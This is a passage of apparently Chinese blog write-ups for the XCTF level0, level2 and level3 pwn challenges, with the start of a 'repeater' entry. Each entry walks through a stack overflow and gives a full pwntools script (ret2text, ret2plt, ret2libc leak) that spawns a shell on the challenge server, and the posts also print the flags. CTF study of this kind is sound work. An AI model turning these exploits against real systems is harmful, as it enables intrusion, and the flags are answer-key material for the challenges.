src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%204.png" alt="攻防世界-level0 4.png"></p><p>通过 <code>read()</code> 输入 <code>0x200</code> 个字符</p><p>在 IDA 左侧发现一个 <code>callsystem()</code> 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%205.png" alt="攻防世界-level0 5.png"></p><p>用来执行 <code>system(&quot;/bin/sh&quot;)</code>，而通过正常的 <code>main()</code> 函数是无法执行这个 <code>callsystem()</code> 函数的，因此本题的目的是要想办法修改函数的返回值转而执行 <code>callsystem()</code> 函数</p><p>查看输入的 <code>buf</code> 在栈中的位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%206.png" alt="攻防世界-level0 6.png"></p><p>这里的 <code>r</code> 就是 <code>ret</code>，代表函数的返回地点<br>因此通过输入 <code>buf</code> 的数据覆盖来修改 <code>r</code> 为 <code>callsystem()</code> 函数的地址，就可以使程序转而执行 <code>callsystem()</code> 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%207.png" alt="攻防世界-level0 7.png"></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level0"</span><span class="token punctuation">)</span>   <span class="token comment"># 生成对象elf</span>callsystem_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>     <span class="token comment"># 获取callsystem函数的地址，本题为:0x0400596，在ida中可以看到函数的地址</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./level0"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">52125</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>    <span class="token comment"># 这里不用callsystem_addr直接用0x0400596也是可以的</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：<br>这个脚本在远程可以打通，但是 Ubuntu 22.04 本地不可以</p><p>远程的 payload：<br><code>payload = b&#39;a&#39; * (0x80 - 0x00 + 0x08) + p64(callsystem_addr)</code><br><code>payload = b&#39;a&#39; * (0x80 - 0x00 + 0x08) + p64(ret_addr) + p64(callsystem_addr)</code><br>两者之一都可以打通</p><p>但是在本地 Ubuntu 22.04 中，必须使用：<br><code>payload = b&#39;a&#39; * (0x80 - 0x00 + 0x08) + p64(ret_addr) + p64(callsystem_addr)</code><br>需要加上 <code>p64(ret_addr)</code> 堆栈平衡</p><p><em>详见《PWN中64位程序的堆栈平衡》一文</em></p></blockquote><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>cyberpeace{4fe5a9ae3ea3933da95ede70cc81c13a}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%208.png" alt="攻防世界-level0 8.png"></p><p>只出现了 <code>[*] Switching to interactive mode</code>，而没有 <code>[*] Got EOF while reading in interactive</code>，说明已经 PWN 通，得到 flag</p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】level2</title>
      <link href="/posts/435d650b.html"/>
      <url>/posts/435d650b.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>通过构造 ROP 链，<mark>利用 PLT 表找到 <code>system()</code> 函数的地址，执行 <code>system()</code> 函数</mark></p></li><li><p></mark>给 32 位的 <code>system()</code> 函数构造参数，注意提供函数返回值，<em>保持栈的平衡，需要填充 4 个 垃圾数据</em></mark></p></li><li><p>熟悉<mark>使用 exp 获取地址的方法，例如函数的地址、字符串的地址等</mark>；以及<mark>通过 IDA 查看地址的方法</mark>，<em><strong>通过 exp 获取的地址和 IDA 中直接查看的地址是一样的</strong></em></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/1ab77c073b4f4524b73e086d063f884e">【攻防世界】level2</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看文件信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2%201.png" alt="攻防世界-level2 1.png"></p><p>32位 小端序，只开启了栈不可执行</p><p>尝试执行文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2%202.png" alt="攻防世界-level2 2.png"></p><p>在 IDA 分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2%203.png" alt="攻防世界-level2 3.png"></p><p>跟进 <code>vulnerable_function()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2%204.png" alt="攻防世界-level2 4.png"></p><p>通过 <code>read()</code> 向 <code>buf</code> 写入长度为 0x100 的数据，但是栈中 <code>buf</code> 的长度只有 0x88，可以栈溢出<br>但是没有发现其他执行类似 <code>system(&quot;/bin/sh&quot;)</code> 命令的函数</p><p>查看字符串发现 “<code>/bin/sh</code>“：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2%205.png" alt="攻防世界-level2 5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2%206.png" alt="攻防世界-level2 6.png"></p><p>只要想办法执行这里的 “<code>/bin/sh</code>“ 即可</p><p>由于这里给出了 <code>system()</code> 函数，可以利用这个函数执行 system 的命令</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2%207.png" alt="攻防世界-level2 7.png"></p><p>如果将 <code>/bin/sh</code> 作为参数 <code>command</code> 传入 <code>system()</code> 函数，就可以 PWN 掉靶机</p><p>所以思路如下：<br>① 首先需要通过 <code>PLT</code>、<code>GOT</code> 表找到 <code>system()</code> 函数的地址；<br>② 通过栈溢出实现函数跳转，让程序执行 <code>system()</code> 函数；<br>③ 再找到 <code>/bin/sh</code> 的地址；<br>④ 利用 <code>system()</code> 函数将 <code>/bin/sh</code> 执行，就可以实现 PWN 操作</p><p>查看输入的 buf 在栈中的位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2%208.png" alt="攻防世界-level2 8.png"></p><p>首先填充 <code>b&#39;a&#39; * (0x88 - 0x00 + 0x04)</code> 个字符，然后接上 <code>system()</code> 函数的地址作为返回值，使程序转而执行 <code>system()</code> 函数</p><p><mark>至于 <code>system()</code> 函数的地址，可以根据 <code>system_plt_addr = elf.plt[&quot;system&quot;]</code> 从 PLT 表中获取<br>   另外，在 IDA 中，直接搜索函数 “system”，可以看到 <code>.plt</code> 段的函数 <code>.system</code> 的地址为 <code>0x08048320</code></mark></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2%209.png" alt="攻防世界-level2 9.png"></p><p><mark>接下来就是给 <code>system()</code> 函数提供参数 <code>/bin/sh</code><br>   可以通过 <code>bin_sh_addr = next(elf.search(b&quot;/bin/sh&quot;))</code> 在程序中搜索 <code>/bin/sh</code> 的地址<br>   也可以直接在 IDA 中，看到字符串 <code>/bin/sh</code> 的地址为 <code>0x0804A024</code></mark></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2%2010.png" alt="攻防世界-level2 10.png"></p><p>注意这里需要用 4 个字节作为 <code>system(&quot;/bin/sh&quot;)</code> 的返回地址，使栈保持平衡</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'i386'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level2"</span><span class="token punctuation">)</span>     <span class="token comment"># 生成对象elf</span>system_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>     <span class="token comment"># 根据plt表获取system的地址，根据ida可知.plt段指向的.system的地址为0x08048320</span>bin_sh_addr <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment"># 在程序中搜寻/bin/sh的地址，根据ida可知地址为0x0804A024</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./level2"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56085</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口，注意是remote</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_plt_addr<span class="token punctuation">)</span>    <span class="token comment"># 跳转到system函数的地址，system_plt_addr直接写0x08048320也可以</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token comment"># 填入4个垃圾字符作为返回地址，保持栈平衡，bin_sh_addr直接填0x0804A024也可以</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>cyberpeace{437e920e2e285d2484407590036a7d62}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2%2011.png" alt="攻防世界-level2 11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】level3</title>
      <link href="/posts/345a559d.html"/>
      <url>/posts/345a559d.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><mark>当 <code>elf</code> 文件中没有给出 <code>system()</code> 函数和字符串 <code>&quot;/bin/sh&quot;</code> 的地址时，如果给出了一个库文件 <code>libc</code>，可以通过库文件来确定基地址，然后根据基地址反向推出 <code>elf</code> 文件中的 <code>system()</code> 函数以及 <code>&quot;/bin/sh&quot;</code> 的地址</mark></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/4005b2fef2a24a89963f0bfdcac9d0f3.gz">【攻防世界】level3</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>得到一个可执行文件和一个 32 位库文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3%201.png" alt="攻防世界-level3 1.png"></p><p>查看文件信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3%202.png" alt="攻防世界-level3 2.png"></p><p>32位 小端序，只开启了栈不可执行</p><p>尝试运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3%203.png" alt="攻防世界-level3 3.png"></p><p>在 IDA 中分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3%204.png" alt="攻防世界-level3 4.png"></p><p>进入漏洞函数 <code>vulnerable_function()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3%205.png" alt="攻防世界-level3 5.png"></p><p>查看 <code>buf</code> 所在位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3%206.png" alt="攻防世界-level3 6.png"></p><p><code>buf</code> 在栈中的长度为 0x88，但可以通过 <code>read()</code> 输入的长度为 0x100，存在溢出点</p><p>查看字符串：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3%207.png" alt="攻防世界-level3 7.png"></p><p>本题没有 <code>&quot;/bin/sh&quot;</code>，也无法向段中写入数据</p><p>在 IDA 中查看函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3%208.png" alt="攻防世界-level3 8.png"></p><p>发现本题没有给出 <code>system()</code> 函数</p><p>但是由于本题给出了一个 32位 库文件，结合题目给出的提示，通过该 <code>libc</code> 库文件入手<br>同时，根据题目，程序中没有现成的 <code>system()</code> 函数，这就需要我们从 <code>libc</code> 中动态加载 <code>system()</code> 函数</p><p><strong>由于 <code>PIE</code> 没有开启，也就是说程序地址不是随机化的</strong>，那么在 <code>libc</code> 中函数的偏移地址就是固定的，只要确定了 <code>libc</code> 的基地址，然后计算出 <code>system()</code> 函数的偏移地址，就可以定位到 <code>system()</code> 函数的真实地址，实现调用</p><p><mark><code>libc</code> 中的函数的相对地址是固定的</mark>，要想获取到 <code>system()</code> 函数的地址，可以通过 <code>write()</code> 函数进行 <code>offset</code> 计算：</p><ol><li>首先利用 <code>write()</code> 函数计算出 <code>write()</code> 函数的真实地址</li><li>利用相对 <code>offset</code> 计算出 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 的真实地址</li></ol><p>先使用 <code>write()</code> 泄露 <code>got</code> 表中的地址，计算出 <code>libc</code> 的基地址，调用完成之后返回到 <code>vulnerable_function()</code>，计算出 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 在内存中的地址，然后再进行一次栈溢出调用 <code>system(&quot;/bin/sh&quot;)</code> 即可</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token comment"># elf</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level3/level3"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成elf对象</span>elf_main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取elf文件中main函数的地址</span>elf_write_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取elf文件中write函数在PLT表中的地址</span>elf_write_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取elf文件中write函数在GOT表中的地址</span><span class="token comment"># libc</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level3/libc_32.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成libc对象</span>libc_write_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取libc库中的write函数的地址</span>libc_system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取libc库中的system函数的地址</span>lib_bin_sh_addr <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 在libc库中搜索"/bin/sh"字符串的地址</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./level3/level3"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">63027</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf_write_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf_main_addr<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf_write_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 接收数据: write函数在elf文件中的地址</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"write_addr: "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将此地址打印出来(每次执行结果不一样)</span>    base_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc_write_addr  <span class="token comment"># 根据elf文件中的write_addr计算得到基地址</span>    system_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> libc_system_addr  <span class="token comment"># 根据基地址base_addr计算得到elf文件中system函数地址</span>    bin_sh_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> lib_bin_sh_addr  <span class="token comment"># 根据基地址base_addr计算得到elf文件中"/bin/sh"的地址</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment"># 得到了函数在elf文件中的真实地址后，按照以往的正常调用方式来写即可</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token comment"># 填充4个垃圾字符平衡栈，使"/bin/sh"作为system函数的参数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>cyberpeace{ee17c7e9631b2894da88efa5205b4a8c}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3%209.png" alt="攻防世界-level3 9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】repeater</title>
      <link href="/posts/617be7.html"/>
      <url>/posts/617be7.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>IDA 中看到的地址是偏移地址</mark>，当开启了 <code>PIE</code> 地址随机化时，<strong>真实地址 &#x3D; 程序的基地址 + 偏移地址</strong></p></li><li><p><mark>可以直接向 <code>.bss</code> 段上写入 <code>shellcode</code>，再通过栈溢出去执行段上的 <code>shellcode</code></mark></p></li><li><p><mark>开启 <code>PIE</code> 地址随机化后，程序执行过程中打印的地址就是真实的地址</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/ad96eacb-7944-4e2c-a5f1-0e9255c06639.zip">【攻防世界】repeater</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看文件信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater1.png" alt="攻防世界-repeater1.png"></p><p>64位 小端序，开启了 <code>PIE</code> 地址随机化</p><p>尝试运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater2.png" alt="攻防世界-repeater2.png"></p><p>存在溢出</p><p>在 IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater3.png" alt="攻防世界-repeater3.png"></p><p>首先通过 <code>memset()</code> 函数将 <code>byte_202040</code> 的地址初始化，然后通过 <code>sub_982()</code> 函数将用户输入写到 <code>byte_202040</code> 地址处</p><p>查看 <code>byte_202040</code> 地址的位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater4.png" alt="攻防世界-repeater4.png"></p><p>发现 <code>byte_202040</code> 是存储到 <code>.bss</code> 段上的</p><p>由于这个题的函数列表中没有给出 <code>system()</code> 函数，因此在 <code>.bss</code> 段上写入 <code>&quot;/bin/sh&quot;</code> 再通过 <code>system()</code> 函数来调用执行的方法是不行了；不过可以考虑在 <code>.bss</code> 段上写入 <code>shellcode</code>，让程序跳转到这里来执行 <code>shellcode</code></p><p>但是这个题<mark>开启了 <code>PIE</code> 地址随机化，因此在 IDA 中看到的地址并不是程序中真实的地址，而是偏移地址</mark><br>所以即使将 <code>shellcode</code> 写入到 <code>0x202040</code> 的地址上，也并不知道 <code>shellcode</code> 在程序中存放的真实地址，需要先确定程序的基地址，就可以通过 <strong>真实地址 &#x3D; 基地址 + 偏移地址</strong> 计算出来</p><p>观察到 for 循环中会打印出 <code>main()</code> 函数的地址【<strong>这个是函数在程序中的真实地址</strong>】</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater5.png" alt="攻防世界-repeater5.png"></p><p>但是打印 <code>main()</code> 函数的地址需要 <code>v5 == 3281697</code>，而程序中定义的是 <code>v5 = 1192227</code><br>注意到还有一个 <code>read()</code> 函数进行输入，将输入存储到 <code>s</code> 中，输入的长度为 <code>0x40</code></p><p>查看 <code>s</code> 所在的位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater6.png" alt="攻防世界-repeater6.png"></p><p>由于 <code>read()</code> 输入的长度是 <code>0x40</code>，而 <code>s</code> 在栈中的长度是 <code>0x20</code>，因此是可以溢出的</p><p>接下来思路就很明确了：</p><ol><li>在输入 <code>name</code> 的时候，由于是存储到 <code>.bss</code> 